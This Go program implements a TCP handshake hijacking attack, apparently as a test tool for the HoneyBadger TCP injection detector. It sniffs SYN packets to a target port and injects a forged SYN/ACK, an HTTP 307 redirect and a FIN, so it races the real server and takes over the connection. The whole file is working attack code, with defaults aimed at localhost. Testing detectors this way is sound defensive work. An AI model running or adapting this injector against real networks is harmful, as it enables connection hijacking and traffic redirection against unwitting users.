/*
 *    TCP handshake hijack implementation
 *    Copyright (C) 2014, 2015  David Stainton
 *
 *    This program is free software: you can redistribute it and/or modify
 *    it under the terms of the GNU General Public License as published by
 *    the Free Software Foundation, either version 3 of the License, or
 *    (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public License
 *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package main

import (
	"flag"
	"github.com/david415/HoneyBadger/attack"
	"github.com/google/gopacket"
	"github.com/google/gopacket/examples/util"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/tcpassembly"
	"log"
	"math/rand"
	"time"
)

var iface = flag.String("i", "lo", "Interface to get packets from")
var filter = flag.String("f", "tcp and dst port 9666 and tcp[tcpflags] == tcp-syn", "BPF filter for pcap")
var snaplen = flag.Int("s", 65536, "SnapLen for pcap packet capture")
var serviceIPstr = flag.String("d", "127.0.0.1", "target TCP flows from this IP address")
var servicePort = flag.Int("e", 9666, "target TCP flows from this port")

func main() {
	defer util.Run()()

	var eth layers.Ethernet
	var dot1q layers.Dot1Q
	var ip4 layers.IPv4
	var tcp layers.TCP
	var payload gopacket.Payload

	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	hijackSeq := r.Uint32()

	decoded := make([]gopacket.LayerType, 0, 4)

	streamInjector := attack.TCPStreamInjector{}
	err := streamInjector.Init("0.0.0.0")
	if err != nil {
		panic(err)
	}

	handle, err := pcap.OpenLive(*iface, int32(*snaplen), true, pcap.BlockForever)
	if err != nil {
		log.Fatal("error opening pcap handle: ", err)
	}
	if err := handle.SetBPFFilter(*filter); err != nil {
		log.Fatal("error setting BPF filter: ", err)
	}
	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
		&eth, &dot1q, &ip4, &tcp, &payload)

	log.Print("collecting packets...\n")
	for {
		data, ci, err := handle.ZeroCopyReadPacketData()
		if err != nil {
			log.Printf("error getting packet: %v %s", err, ci)
			continue
		}
		err = parser.DecodeLayers(data, &decoded)
		if err != nil {
			log.Printf("error decoding packet: %v", err)
			continue
		}

		// craft a response to the client
		// here we reuse the client's header
		// by swapping addrs and ports

		// swap ip addrs
		srcip := ip4.SrcIP
		ip4.SrcIP = ip4.DstIP
		ip4.DstIP = srcip

		// swap ports
		srcport := tcp.SrcPort
		tcp.SrcPort = tcp.DstPort
		tcp.DstPort = srcport

		// empty payload for SYN/ACK handshake completion
		streamInjector.Payload = []byte("")
		seq := tcp.Seq
		tcp.Seq = hijackSeq
		tcp.Ack = uint32(tcpassembly.Sequence(seq).Add(1))
		tcp.ACK = true
		tcp.SYN = true
		tcp.RST = false

		err = streamInjector.SetIPLayer(ip4)
		if err != nil {
			panic(err)
		}
		streamInjector.SetTCPLayer(tcp)
		err = streamInjector.Write()
		if err != nil {
			panic(err)
		}
		log.Print("SYN/ACK packet sent!\n")

		// send rediction payload
		redirect := []byte("HTTP/1.1 307 Temporary Redirect\r\nLocation: http://127.0.0.1/?\r\n\r\n")
		streamInjector.Payload = redirect
		tcp.PSH = true
		tcp.SYN = false
		tcp.ACK = true
		tcp.Ack = uint32(tcpassembly.Sequence(seq).Add(1))
		tcp.Seq = uint32(tcpassembly.Sequence(hijackSeq).Add(1))

		err = streamInjector.SetIPLayer(ip4)
		if err != nil {
			panic(err)
		}
		streamInjector.SetTCPLayer(tcp)
		err = streamInjector.Write()
		if err != nil {
			panic(err)
		}
		log.Print("redirect packet sent!\n")

		// send FIN
		streamInjector.Payload = []byte("")
		tcp.FIN = true
		tcp.SYN = false
		tcp.ACK = false
		tcp.Seq = uint32(tcpassembly.Sequence(hijackSeq).Add(2))

		err = streamInjector.SetIPLayer(ip4)
		if err != nil {
			panic(err)
		}
		streamInjector.SetTCPLayer(tcp)
		err = streamInjector.Write()
		if err != nil {
			panic(err)
		}
		log.Print("FIN packet sent!\n")
	}
}
